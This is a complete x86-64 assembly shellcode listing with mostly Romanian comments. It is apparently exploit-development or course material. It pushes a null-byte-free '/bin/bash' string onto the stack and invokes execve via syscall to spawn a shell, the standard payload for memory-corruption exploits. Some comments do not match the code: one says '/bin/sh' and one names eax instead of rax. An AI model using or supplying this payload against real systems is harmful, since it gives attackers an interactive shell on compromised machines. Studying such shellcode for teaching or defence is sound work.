section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx            ; se pune pe stiva argumentul; nu exista env
      mov rax, "h1234567" ; se pune in rax restul stringului, adica h, urmat de octeti diferiti de 0
      shl rax, 56         ; se elimina octetii redundanti inserati, introducand octeti de 0
      shr rax, 56         ; se readuce h-u pe pozitia lui initiala
      push rax            ; se incarca pe stiva h-ul
      mov rax,'/bin/bas'  ; se incarca in registrul rax o parte din comanda 
      push rax            ; se pune pe stiva continutul registrul eax
      mov rdi, rsp        ; 1st argument
      push rdx            ; se pune env 0 
      push rdi            ; se puned adresa comenzii 
      mov rsi, rsp        ; 2nd argument se stocheaza 
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
